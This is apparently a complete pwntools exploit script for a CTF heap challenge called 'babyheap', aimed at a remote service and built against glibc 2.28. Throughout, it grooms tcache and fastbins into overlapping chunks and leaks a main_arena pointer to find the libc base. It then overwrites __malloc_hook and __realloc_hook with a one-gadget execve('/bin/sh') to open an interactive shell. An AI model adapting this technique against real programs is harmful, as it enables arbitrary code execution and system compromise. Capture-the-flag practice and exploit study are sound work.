#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import random
import struct
import os
import binascii
import sys
import time

# context.log_level = 'debug'
# sh = process("./babyheap", env={"LD_PRELOAD": "./libc-2.28.so"})
# sh = process("./babyheap")
sh = remote('eonew.cn', 60108)
elf = ELF("./babyheap")
libc = ELF("./libc-2.28.so")
# libc = ELF("/glibc/glibc-2.28/debug_x64/lib/libc.so.6")



# Create a temporary file for GDB debugging
try:
    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()
except Exception as e:
    pass
    
def Allocate(size):
    sh.sendline('1')
    sh.recvuntil('Size: ')
    sh.sendline(str(size))
    sh.recvuntil('Command: ')

def Delete(index):
    sh.sendline('3')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    sh.recvuntil('Command: ')

def Update(index, size, content):
    sh.sendline('2')
    sh.recvuntil("Index: ")
    sh.sendline(str(index))
    sh.recvuntil('Size: ')
    sh.sendline(str(size))
    sh.recvuntil('Content: ')
    sh.send(content)
    sh.recvuntil('Command: ')



sh.recvuntil('Command: ')

# run out of the top chunk
for i in range(7):
    Allocate(0x28)
    Update(i, 0x28, '\0' * 0x28)

for i in range(7):
    Delete(i)

for i in range(7):
    Allocate(0x38)
    Update(i, 0x38, '\0' * 0x38)

for i in range(7):
    Delete(i)

for i in range(7):
    Allocate(0x48)
    Update(i, 0x48, '\0' * 0x48)

for i in range(7):
    Delete(i)

for i in range(7):
    Allocate(0x58)
    Update(i, 0x58, '\0' * 0x58)

for i in range(7):
    Delete(i)

# construct fastbin
for i in range(10):
    Allocate(0x28)

for i in range(1, 9):
    Delete(i)

# Trigger consolidate
Allocate(0x38) # index 1
Update(1, 0x38, '\0' * 0x38) # modify size of unsorted bin

Allocate(0x28) # index 2


Allocate(0x28) # index 3
Allocate(0x28) # index 4
Allocate(0x28) # index 5
Allocate(0x28) # index 6
Delete(0)
Delete(1)
Delete(2)

# Trigger second consolidate
# pause()
Allocate(0x48) # index 0
Allocate(0x18) # index 1

Delete(9)

# Trigger third consolidate
# overlaping 4442
Allocate(0x58) # index 2


Allocate(0x28) # index 7
Allocate(0x28) # index 8
Allocate(0x28) # index 9
Allocate(0x28) # index 10
Allocate(0x28) # index 11
Allocate(0x18) # index 12

Delete(7)
Delete(8)
Delete(9)
Delete(10)
Delete(11)

Allocate(0x38) # index 7

sh.sendline('4')
sh.recvuntil('Index: ')
sh.sendline('5')
sh.recvuntil("Chunk[5]: ")
sh.recv(16)

result = sh.recv(8)

# You should calculate the value by yourself
main_arena_addr = u64(result) - 96
libc_addr = main_arena_addr - 0x1e4c40
# main_arena_addr = u64(result) - 96
# libc_addr = main_arena_addr - 0x3a2c40
log.success("main_arena_addr: " + hex(main_arena_addr))
log.success("libc_addr: " + hex(libc_addr))

Allocate(0x48) # index 8

Allocate(0x58) # index 9
Delete(8)
Delete(9)

Update(5, 0x18, p64(0) + p64(0x51) + p64(main_arena_addr + 45))
Allocate(0x48) # index 8
Allocate(0x48) # index 9
Allocate(0x58) # index 10

# hijack top chunk
Update(9, 0x2b, '\0' * (3 + 0x20) + p64(main_arena_addr - 0x33))

# __realloc_hook and __malloc_hook
Allocate(0x38) # index 11

'''
0x50186 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x501e3 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x103f50 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

onegadget_offset = 0x103f50

onegadget_addr = libc_addr + onegadget_offset
log.success("onegadget_addr: " + hex(onegadget_addr))

# hijack __realloc_hook and __malloc_hook
Update(11, 0x1b, 'b' * (3 + 0x8) + p64(onegadget_addr) + p64(libc_addr + libc.symbols['__libc_realloc'] + 6)) # for [rsp+0x70] == NULL

sh.sendline('1')
sh.recvuntil('Size: ')
sh.sendline(str(24))


sh.interactive()